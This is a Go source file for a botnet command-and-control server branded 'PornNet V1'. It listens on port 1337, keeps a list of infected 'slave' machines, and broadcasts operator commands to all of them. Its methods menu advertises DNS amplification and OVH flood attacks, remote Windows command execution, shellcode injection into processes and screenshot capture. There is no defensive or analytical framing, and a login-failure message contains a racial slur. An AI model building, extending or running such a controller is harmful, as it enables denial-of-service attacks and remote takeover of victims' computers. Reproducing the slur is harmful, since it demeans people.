package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

type Bot struct {
	conn net.Conn
	id   int
	addr string
}

var (
	bots      = make(map[int]*Bot)
	botsMutex = sync.Mutex{}
	nextBotID = 1
)

var loggedInUsers = map[string]string{}

func Users() error {
	file, err := os.Open("login.txt")
	if err != nil {
		return err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.SplitN(line, ":", 2)
		if len(parts) == 2 {
			loggedInUsers[parts[0]] = parts[1]
		}
	}
	return nil
}

func handleslaves(bot *Bot) {
	defer func() {
		botsMutex.Lock()
		delete(bots, bot.id)
		botsMutex.Unlock()
		fmt.Printf("[*] Slaves %d disconnected\n", bot.id)
		bot.conn.Close()
	}()

	fmt.Printf("[*] Slaves %d connected from %s\n", bot.id, bot.addr)

	scanner := bufio.NewScanner(bot.conn)
	for scanner.Scan() {
		line := scanner.Text()
		fmt.Printf("[Slaves %d] %s\n", bot.id, line)
	}
}

func broadcast(cmd string) {
	botsMutex.Lock()
	defer botsMutex.Unlock()
	for id, bot := range bots {
		_, err := bot.conn.Write([]byte(cmd + "\n"))
		if err != nil {
			fmt.Printf("[!] Failed to send to slaves %d: %v\n", id, err)
		}
	}
}

func slaves() string {
	botsMutex.Lock()
	defer botsMutex.Unlock()
	var sb strings.Builder
	sb.WriteString("Connected SLAVES:\n")
	for id, bot := range bots {
		sb.WriteString(fmt.Sprintf("  ID %d - %s\n", id, bot.addr))
	}
	return sb.String()
}

func Methods() string {
	return `Available attack methods:
  dnsamp <ip> <duration>  - DNS Amplification
  ovh <ip> <port> <dur>   - OVH attack
  ovhack <ip> <port> <d>  - OVH hack attack
  exec <cmd>              - Execute Windows command on bot
  inject <pid>            - Inject shellcode into process ID
  screenshot              - Capture screenshot`
}

func killer() string {
	return "in progress"
}

func clear() {
	fmt.Print("\033[H\033[2J")
}

func printSplash() {
	clear()
	fmt.Println(`



██████╗  ██████╗ ██████╗ ███╗   ██╗███╗   ██╗███████╗████████╗
██╔══██╗██╔═══██╗██╔══██╗████╗  ██║████╗  ██║██╔════╝╚══██╔══╝
██████╔╝██║   ██║██████╔╝██╔██╗ ██║██╔██╗ ██║█████╗     ██║   
██╔═══╝ ██║   ██║██╔══██╗██║╚██╗██║██║╚██╗██║██╔══╝     ██║   
██║     ╚██████╔╝██║  ██║██║ ╚████║██║ ╚████║███████╗   ██║   
╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝   ╚═╝                                                               
                         PornNet V1
`)
}

func login() bool {
	reader := bufio.NewReader(os.Stdin)
	for tries := 0; tries < 3; tries++ {
		fmt.Print("Username: ")
		user, _ := reader.ReadString('\n')
		user = strings.TrimSpace(user)

		fmt.Print("Password: ")
		pass, _ := reader.ReadString('\n')
		pass = strings.TrimSpace(pass)

		if pw, ok := loggedInUsers[user]; ok && pw == pass {
			fmt.Println("Login successful!")
			return true
		} else {
			fmt.Println("Invalid username or password.")
		}
	}
	return false
}

func main() {
	if err := Users(); err != nil {
		fmt.Println("Failed to load login.txt:", err)
		return
	}

	printSplash()

	if !login() {
		fmt.Println("Too many login failures NIGGA IF U BROKE JS SAY SO!! Exiting.")
		return
	}

	ln, err := net.Listen("tcp", ":1337")
	if err != nil {
		fmt.Println("Listen error:", err)
		return
	}
	defer ln.Close()

	fmt.Println("PornNet listening on port 1337")

	go func() {
		for {
			botsMutex.Lock()
			count := len(bots)
			botsMutex.Unlock()
			fmt.Printf("\r[PornNet] Connected Slaves: %d > ", count)
			time.Sleep(1 * time.Second)
		}
	}()

	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("\n> ")
		line, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Input error:", err)
			continue
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		switch line {
		case "help":
			fmt.Println("Commands: help, slaves, methods, botkiller, logout")
		case "slaves":
			fmt.Print(slaves())
		case "methods":
			fmt.Print(Methods())
		case "botkiller":
			fmt.Println(killer())
		case "logout":
			fmt.Println("Logging out...")
			return
		default:
			broadcast(line)
		}
	}

}

